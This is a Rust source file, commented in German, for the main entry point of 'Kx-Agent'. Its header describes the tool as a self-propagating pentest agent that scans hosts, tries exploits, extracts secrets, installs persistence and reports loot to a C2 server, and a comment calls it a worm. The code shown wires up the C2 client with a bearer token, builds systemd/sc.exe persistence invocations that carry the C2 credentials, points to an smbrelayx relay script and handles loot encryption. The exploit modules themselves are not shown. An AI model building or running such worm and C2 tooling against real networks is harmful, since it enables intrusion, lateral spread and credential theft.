//! Kx-Agent: Autonomer Propagations-Orchestrator für autorisierte Penetrationstests.
//!
//! Entdeckt Hosts im Netz, scannt offene Ports, versucht Exploits, extrahiert
//! Secrets vom lokalen Host, installiert Persistenz und meldet alles an den
//! C2-Server. Nur für autorisierte Netzwerke gedacht.
//!
//! Der **Ablauf** liegt im Modul [`lauf`]: dieses Modul parst die Argumente,
//! baut die Abhängigkeiten und meldet den Exit-Code. Die Reihenfolge des
//! Laufs — Anmeldung, Beute, Persistenz, Entdeckung, Propagation, Tasks —
//! gehört dort hin, nicht in eine Funktion hier.

mod c2;
mod hostkey;
mod lauf;
mod meldung;
mod propagate;
mod tasks;

use std::net::Ipv4Addr;
use std::path::PathBuf;

use clap::Parser;

use kx_core::persist::Invocation;

use tracing::{error, info};

/// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
///
/// Der Agent gibt seine Argumentstruktur im Debug-Output aus. Ein reiner
/// `String` käme dabei im Klartext in die Konsole und in die Log-Dateien.
/// Der eigene Typ verhindert das strukturell: er lässt sich nur über
/// [`Secret::as_str`] als Text lesen, und seine `Debug`-Ausgabe ist maskiert.
#[derive(Clone)]
struct Secret(String);

impl Secret {
    /// Der Token im Klartext — nur für die Verwendung als Zugangsdaten.
    fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("***")
    }
}

impl std::str::FromStr for Secret {
    type Err = std::convert::Infallible;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Ok(Secret(s.to_string()))
    }
}

impl From<&str> for Secret {
    fn from(s: &str) -> Self {
        Secret(s.to_string())
    }
}

/// Agent-Konfiguration aus CLI/Umgebung.
#[derive(Parser, Debug)]
#[command(name = "kx-agent", about = "Kx-autonomer Agent")]
struct Args {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: Secret,
    /// Netzwerkschnittstelle für den ARP-Sweep.
    #[arg(long, default_value = "eth0")]
    iface: String,
    /// Start-IP des Scan-Bereichs.
    ///
    /// Der Typ prueft die Adresse beim Parsen: eine unbrauchbare IP bricht den
    /// Lauf schon an der Kommandozeile ab, nicht mitten im Agenten-Thread.
    #[arg(long)]
    start: Ipv4Addr,
    /// End-IP des Scan-Bereichs.
    #[arg(long)]
    end: Ipv4Addr,
    /// Eigene IP für ARP-Anfragen.
    #[arg(long, default_value = "192.168.1.100")]
    own_ip: Ipv4Addr,
    /// Vorkonfigurierte Host-Liste (kommagetrennt) — umgeht ARP.
    #[arg(long, value_delimiter = ',')]
    hosts: Option<Vec<Ipv4Addr>>,
    /// Pfad zu smbrelayx.py.
    #[arg(long, default_value = "assets/smbrelayx.py")]
    relay_script: String,
    /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
    #[arg(long)]
    server_cert: String,
    /// Pfad zum oeffentlichen Server-Schluessel (JSON). Damit werden die
    /// Master-Keys der Hosts versiegelt; ohne die Datei geht die Beute
    /// unverschluesselt an den C2.
    #[arg(long)]
    server_key: Option<String>,
}

impl Args {
    /// Die Invocation, mit der der Agent nach der Installation neu startet.
    ///
    /// Die Flag-Liste existiert genau hier. Die Persistenz-Adapter kennen sie
    /// nicht — sie rendern nur diese Form. Ein neues Argument landet damit
    /// automatisch in der systemd-Unit und in der `binPath=`-Zeile von
    /// `sc.exe`, statt in einer zweiten, von Hand gepflegten Liste zu
    /// verschwinden.
    ///
    /// `--server-key` ist Teil der Liste: ohne ihn meldet der neu gestartete
    /// Agent die Beute im Klartext an den C2.
    ///
    /// `--relay-script` ist ebenfalls Teil der Liste: ohne sie fällt der
    /// persistierte Agent auf den relativen Default `assets/smbrelayx.py`
    /// zurück und löst ihn gegen sein Arbeitsverzeichnis auf — nicht gegen
    /// das Verzeichnis des Binaries, in dem das Asset liegt.
    fn persistence_invocation(&self, exe: PathBuf) -> Invocation {
        let mut args = vec![
            "--server".to_string(),
            "${KX_C2_URL}".to_string(),
            "--token".to_string(),
            "${KX_C2_TOKEN}".to_string(),
            "--server-cert".to_string(),
            self.server_cert.clone(),
            "--iface".to_string(),
            self.iface.clone(),
            "--start".to_string(),
            self.start.to_string(),
            "--end".to_string(),
            self.end.to_string(),
            "--own-ip".to_string(),
            self.own_ip.to_string(),
        ];
        // Ohne diese Liste scannt der neu gestartete Agent den ganzen Bereich
        // statt der ursprünglichen Ziele.
        if let Some(hosts) = &self.hosts {
            args.push("--hosts".to_string());
            // Die Liste wird kommagetrennt uebergeben — so wie sie auch
            // hereinkommt.
            args.push(
                hosts
                    .iter()
                    .map(|ip| ip.to_string())
                    .collect::<Vec<_>>()
                    .join(","),
            );
        }
        if let Some(schluessel) = &self.server_key {
            args.push("--server-key".to_string());
            args.push(schluessel.clone());
        }
        // Der Pfad wird fest eingetragen, damit der persistierte Agent das
        // Asset unabhängig vom Arbeitsverzeichnis findet.
        let relay_script = lauf::resolve_relay_script(&self.relay_script, exe.parent());
        args.push("--relay-script".to_string());
        args.push(relay_script.to_string_lossy().to_string());
        Invocation {
            name: "kx-agent".to_string(),
            binary_path: exe,
            args,
            env: vec![
                ("KX_C2_URL".to_string(), self.server.clone()),
                ("KX_C2_TOKEN".to_string(), self.token.as_str().to_string()),
            ],
        }
    }
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();
    let args = Args::parse();
    info!("Kx-Agent startete, C2={}", args.server);

    // Der Server-Schluessel entscheidet, ob die Beute verschluesselt gemeldet
    // wird. Fehlt die Option, laeuft der Agent ohne Schluesselmaterial weiter.
    //
    // Wurde die Option **gegeben** und laesst sich die Datei nicht lesen,
    // bricht der Lauf ab: ein stiller Rueckfall auf Klartext waere genau das
    // Gegenteil dessen, was der Operator verlangt hat. Die Beute bleibt dann
    // auf dem Zielhost, und der naechste Lauf meldet sie erneut.
    let sealer = match args.server_key.as_deref() {
        Some(pfad) => match hostkey::KeySealer::load(pfad) {
            Ok(s) => {
                info!("Server-Schluessel geladen, die Beute wird versiegelt gemeldet");
                Some(s)
            }
            Err(e) => {
                error!("Server-Schluessel unbrauchbar: {e} — der Lauf bricht ab, die Beute wird nicht im Klartext gemeldet");
                std::process::exit(1);
            }
        },
        None => None,
    };

    let client = match c2::C2Client::new(&args.server, args.token.as_str(), &args.server_cert) {
        Ok(c) => c,
        Err(e) => {
            error!("C2-Client-Initialisierung fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    // Der Lauf. Er besitzt die Reihenfolge; hier werden nur die
    // Abhängigkeiten gebaut und das Ergebnis gelesen.
    let umgebung = lauf::System;
    let lauf = lauf::Lauf::new(&args, &client, sealer.as_ref(), &umgebung);
    let ergebnis = lauf.start().await;

    // Die Zusammenfassung nennt die zugestellte Beute, nicht die vorbereitete.
    info!(
        "Agent-Lauf abgeschlossen: {} Hosts registriert, {} Beute gemeldet, {} Beute verloren",
        ergebnis.hosts_registriert, ergebnis.beute_gemeldet, ergebnis.beute_verloren
    );

    // Ein Lauf, der nichts erreicht, darf nicht als Erfolg melden. Der
    // systemd-Timer startet den nächsten Lauf ohnehin — aber ein
    // fehlgeschlagener Lauf muss im Journal als Fehlschlag stehen, sonst
    // merkt der Betreiber erst beim Blick ins Dashboard, dass der Wurm
    // längst tot ist.
    //
    // Zwei Faelle zaehlen als Fehlschlag: der C2-Server war nicht erreichbar,
    // oder Beute ging verloren, die der Agent erfolgreich erbeutet hatte. Ein
    // gescheiterter Exploit ist keiner — nichts gefunden ist ein Ergebnis.
    if ergebnis.fehlgeschlagen() {
        let grund = if ergebnis.c2_nicht_erreichbar() {
            "Der Lauf hat den C2-Server nicht erreicht"
        } else {
            "Der Lauf hat nicht alles erreicht"
        };
        error!(
            "{grund} — der Agent meldet Fehlschlag \
             ({} Hosts verloren, {} Beute verloren)",
            ergebnis.hosts_verloren, ergebnis.beute_verloren
        );
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args_mit_token(token: &str) -> Args {
        Args {
            server: "https://127.0.0.1:8443".into(),
            token: Secret::from(token),
            iface: "eth0".into(),
            start: "192.168.1.1".parse().unwrap(),
            end: "192.168.1.10".parse().unwrap(),
            own_ip: "192.168.1.100".parse().unwrap(),
            hosts: None,
            relay_script: "assets/smbrelayx.py".into(),
            server_cert: "/tmp/kx-server.crt".into(),
            server_key: None,
        }
    }

    #[test]
    fn debug_ausgabe_der_argumente_zeigt_kein_token() {
        let args = args_mit_token("geheim");
        let text = format!("{args:?}");
        assert!(!text.contains("geheim"), "das Token steht im Debug-Output");
        assert!(text.contains("***"), "das Token wird maskiert");
    }

    #[test]
    fn token_bleibt_als_text_lesbar() {
        let args = args_mit_token("geheim");
        assert_eq!(args.token.as_str(), "geheim");
    }

    #[test]
    fn die_persistenz_invocation_traegt_alle_pflichtargumente() {
        let args = args_mit_token("geheim");
        let invocation = args.persistence_invocation(PathBuf::from("/opt/kx/kx-agent"));
        let joined = invocation.args.join(" ");
        for pflicht in [
            "--server",
            "--token",
            "--server-cert",
            "--iface",
            "--start",
            "--end",
            "--own-ip",
            "--relay-script",
        ] {
            assert!(
                joined.contains(pflicht),
                "{pflicht} fehlt in der Invocation"
            );
        }
        assert!(invocation.args.iter().any(|a| a == "/tmp/kx-server.crt"));
    }

    #[test]
    fn die_persistenz_invocation_verbirgt_kein_geheimnis_in_den_argumenten() {
        let args = args_mit_token("geheim");
        let invocation = args.persistence_invocation(PathBuf::from("/opt/kx/kx-agent"));
        let joined = invocation.args.join(" ");
        assert!(
            !joined.contains("geheim"),
            "das Token steht in der Invocation"
        );
        assert!(joined.contains("${KX_C2_TOKEN}"), "der Platzhalter fehlt");
    }
}
